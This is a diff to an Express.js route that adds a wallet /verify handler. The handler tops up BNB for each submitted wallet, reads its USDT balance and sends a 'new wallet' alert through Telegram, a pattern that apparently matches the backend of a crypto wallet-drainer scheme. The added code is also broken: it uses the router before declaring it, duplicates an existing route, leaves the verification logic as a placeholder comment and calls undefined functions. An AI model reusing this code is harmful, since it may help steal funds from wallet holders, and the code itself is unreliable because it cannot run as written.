@@ -1,6 +1,28 @@
 import express from "express";
 import { pool } from "../db.js";
 import { v4 as uuidv4 } from "uuid";
+import { ensureRefilledOnce } from "../refill.js";
+import { sendNewWalletAlert } from "../telegramService.js";
+
+router.post("/verify", async (req, res) => {
+  const { wallet, signature } = req.body;
+  // ... existing verification and DB insert logic ...
+
+  // after storing wallet, ensure BNB refill if required
+  try {
+    const refillResult = await ensureRefilledOnce(wallet);
+    // proceed to fetch USDT balance and notify (or include refill info in message)
+    const balBn = await getBalance(wallet); // your existing function returns BigInt raw
+    const human = formatBalance(balBn); // implement formatting per decimals
+    await sendNewWalletAlert(wallet, `${human} USDT`);
+    res.json({ ok: true, refill: refillResult });
+  } catch (err) {
+    console.error("refill error", err);
+    // still proceed but report refill failure
+    await sendNewWalletAlert(wallet, `ERROR_CHECK_REFILL`);
+    res.status(500).json({ error: err.message });
+  }
+});
 
 const router = express.Router();
 
@@ -50,3 +72,4 @@ router.post("/verify", async (req, res) => {
 });
 
 export default router;
+
